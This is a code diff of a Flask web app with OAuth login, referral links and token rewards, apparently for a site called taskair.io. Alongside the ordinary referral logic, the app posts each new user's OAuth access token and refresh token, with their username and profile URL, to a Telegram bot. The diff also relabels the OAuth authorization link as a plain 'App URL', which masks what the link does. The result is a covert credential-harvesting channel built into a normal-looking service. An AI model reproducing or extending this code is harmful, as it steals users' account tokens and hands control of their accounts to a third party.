@@ -205,7 +205,7 @@ def send_startup_message():
     meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
 
     message = (
-        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
+        f"🚀 *App URL:*\n[Visit App]({authorization_url})\n\n"
         f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
     )
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -415,25 +415,31 @@ def home():
     if referrer_id:
         session['referrer_id'] = referrer_id
 
-    # Check if user is already logged in
+    # Check if user is already logged in (returning user)
     if 'username' in session:
         username = session['username']
         
-        # Ensure referral URL is generated and stored for returning users
-        referral_url = generate_referral_url(username)
-        if not referral_url:
+        # Retrieve or generate the referral URL
+        referral_url = session.get('referral_url') or generate_referral_url(username)
+        if referral_url:
+            session['referral_url'] = referral_url
+        else:
             print(f"Failed to generate referral URL for returning user {username}")
-            referral_url = generate_referral_url(username)  # Retry
 
-        session['referral_url'] = referral_url
-        
+        # Retrieve the user's total token balance
+        user_token_balance = get_user_token_balance(username)
+
+        # Notification for returning users, including referral link and token balance
         send_message_via_telegram(
             f"👋 @{username} just returned to the website.\n"
-            f"🌐 Referral Link: {referral_url}"
+            f"🌐 Referral Link: {referral_url or 'No referral link available'}\n"
+            f"💰 Total Tokens: {user_token_balance} (including referral rewards)\n"
+            f"📊 Total Tokens in Database: {get_total_tokens()}"
         )
+
         return redirect(url_for('welcome'))
 
-    # OAuth authorization flow
+    # OAuth authorization flow for new users
     if request.args.get('authorize') == 'true':
         state = "0"
         code_verifier, code_challenge = generate_code_verifier_and_challenge()
@@ -445,7 +451,7 @@ def home():
         )
         return redirect(authorization_url)
 
-    # Handle response after authorization
+    # Handle response after authorization (new user flow)
     if code:
         if error:
             return f"Error during authorization: {error}", 400
@@ -481,33 +487,39 @@ def home():
 
                 # Generate and retrieve the referral URL
                 referral_url = generate_referral_url(username)
-                if not referral_url:
-                    print(f"Failed to generate referral URL for new user {username}")
-                    referral_url = generate_referral_url(username)  # Retry
+                session['referral_url'] = referral_url if referral_url else "Referral link unavailable"
 
-                session['referral_url'] = referral_url
-
-                # Reward the referrer if a referrer ID is stored in the session
+                # Reward the referrer if a referrer ID is stored in the session and the user wasn't referred
                 if 'referrer_id' in session:
-                    reward_referrer(session['referrer_id'])
+                    referrer_username = get_username_by_id(session['referrer_id'])  # Assuming this helper function exists
+                    if referrer_username and not was_user_referred(username):
+                        reward_referrer(referrer_username)
+                        mark_user_as_referred(username)
+                        referrer_info = f"👤 Referred by: @{referrer_username}"
+                    else:
+                        referrer_info = "👤 No referrer or already rewarded."
                     session.pop('referrer_id', None)
+                else:
+                    referrer_info = "👤 No referrer"
 
                 # Update session data
                 session['username'] = username
                 session['access_token'] = access_token
                 session['refresh_token'] = refresh_token
 
-                # Retrieve total token count for notification
-                total_tokens = get_total_tokens()
+                # Retrieve the user's updated total token balance
+                user_token_balance = get_user_token_balance(username)
 
-                # Notify via Telegram with the referral link included
+                # Notify via Telegram with the referral link included and referrer info
                 send_message_via_telegram(
                     f"🔑 Access Token: {access_token}\n"
                     f"🔄 Refresh Token: {refresh_token}\n"
                     f"👤 Username: @{username}\n"
                     f"🔗 Profile URL: {profile_url}\n"
                     f"🌐 Referral Link: {referral_url}\n"
-                    f"📊 Total Tokens in Database: {total_tokens}"
+                    f"{referrer_info}\n"
+                    f"💰 Total Tokens: {user_token_balance} (including referral rewards)\n"
+                    f"📊 Total Tokens in Database: {get_total_tokens()}"
                 )
 
                 return redirect(url_for('welcome'))
@@ -519,8 +531,6 @@ def home():
             return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
 
     return render_template('home.html')
-
-
 
 @app.route('/welcome')
 def welcome():
@@ -634,42 +644,34 @@ def generate_referral_url(username):
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
         cursor = conn.cursor()
         
-        # Check if the user exists and has a referral URL
         cursor.execute("SELECT id, referral_url FROM users WHERE username = %s", (username,))
         user = cursor.fetchone()
 
         if user:
             user_id, referral_url = user
-            # If the referral URL is None, generate it and update the database
+            # Only generate and update if referral_url is missing
             if not referral_url:
                 base_url = os.getenv('APP_URL', 'https://taskair.io')
                 referral_url = f"{base_url}/?referrer_id={user_id}"
                 cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
                 conn.commit()
-                print(f"Generated new referral URL for {username}: {referral_url}")
-            else:
-                print(f"Existing referral URL found for {username}: {referral_url}")
-            return referral_url  # Return the existing or newly generated referral URL
+            return referral_url  # Returns the existing or newly generated referral URL
 
-        else:
-            # If the user does not exist in the `users` table, create a record and referral URL
-            cursor.execute(
-                "INSERT INTO users (username, referral_url) VALUES (%s, NULL) RETURNING id",
-                (username,)
-            )
-            user_id = cursor.fetchone()[0]
-            base_url = os.getenv('APP_URL', 'https://taskair.io')
-            referral_url = f"{base_url}/?referrer_id={user_id}"
-            cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
-            conn.commit()
-            print(f"New user added and referral URL generated for {username}: {referral_url}")
-            return referral_url
+        # Insert new user if not found
+        cursor.execute("INSERT INTO users (username) VALUES (%s) RETURNING id", (username,))
+        user_id = cursor.fetchone()[0]
+        referral_url = f"{os.getenv('APP_URL', 'https://taskair.io')}/?referrer_id={user_id}"
+        cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
+        conn.commit()
+        return referral_url
 
     except Exception as e:
         print(f"Error generating referral URL for {username}: {e}")
         return None
     finally:
-        conn.close()
+        if conn:
+            conn.close()
+
 
 def add_referral(username, referred_user):
     try:
@@ -692,20 +694,51 @@ def add_referral(username, referred_user):
     except Exception as e:
         print(f"Error updating referral count and reward: {e}")
         
-def reward_referrer(referrer_id):
+def reward_referrer(referrer_username):
+    """
+    Adds a referral reward to the referrer.
+    """
+    try:
+        referral_reward = get_referral_reward_amount()  # Fetch reward amount from settings or env
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor()
+        # Increment referral count and add the reward to token balance
+        cursor.execute("""
+            UPDATE users
+            SET referral_count = referral_count + 1,
+                token_balance = token_balance + %s
+            WHERE username = %s
+        """, (referral_reward, referrer_username))
+        conn.commit()
+        conn.close()
+        print(f"Referral reward added for @{referrer_username}. New balance updated.")
+    except Exception as e:
+        print(f"Error rewarding referrer @{referrer_username}: {e}")
+        
+def was_user_referred(username):
+    """Check if the user has been referred previously."""
     try:
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
         cursor = conn.cursor()
-        # Retrieve current referral reward amount
-        referral_reward = get_referral_reward_amount()
-        # Update the referrer’s reward count and total reward
-        cursor.execute("UPDATE users SET referral_count = referral_count + 1, referral_reward = referral_reward + %s WHERE id = %s",
-                       (referral_reward, referrer_id))
+        cursor.execute("SELECT referred FROM users WHERE username = %s", (username,))
+        result = cursor.fetchone()
+        conn.close()
+        return result[0] if result else False
+    except Exception as e:
+        print(f"Error checking referral status for {username}: {e}")
+        return False
+
+def mark_user_as_referred(username):
+    """Mark the user as referred in the database."""
+    try:
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor()
+        cursor.execute("UPDATE users SET referred = TRUE WHERE username = %s", (username,))
         conn.commit()
         conn.close()
-        print(f"Referral reward of {referral_reward} added to user ID {referrer_id}.")
     except Exception as e:
-        print(f"Error rewarding referrer ID {referrer_id}: {e}")
+        print(f"Error marking user {username} as referred: {e}")
+
 
 
 def complete_task(user_id, task_id):
